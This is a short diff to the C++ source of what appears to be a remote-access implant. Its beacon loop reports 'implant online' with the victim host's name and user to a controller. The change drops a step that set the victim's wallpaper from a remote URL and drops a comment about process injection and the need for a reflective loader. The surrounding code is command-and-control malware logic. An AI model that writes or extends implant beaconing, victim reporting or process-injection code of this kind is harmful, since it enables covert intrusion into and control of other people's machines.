@@ -767,14 +767,9 @@ DWORD BeaconLoop(const Session& session) {
             }
             failures = 0;
 
-            // First successful beacon: set wallpaper, send hello
+            // First successful beacon: send hello
             if (!sentHello) {
                 sentHello = true;
-                SetWallpaperFromUrl(L"wallpaperaccess.com", L"/full/2012878.jpg");
-
-                // ponytail: auto-migrate removed — raw PE injection without a reflective
-                // loader crashes the target. Re-enable when a reflective loader is wired in.
-
                 SendResult(session.sessionId,
                     L"[ghost] implant online\r\nhost: " + session.hostname +
                     L"\r\nuser: " + session.username +
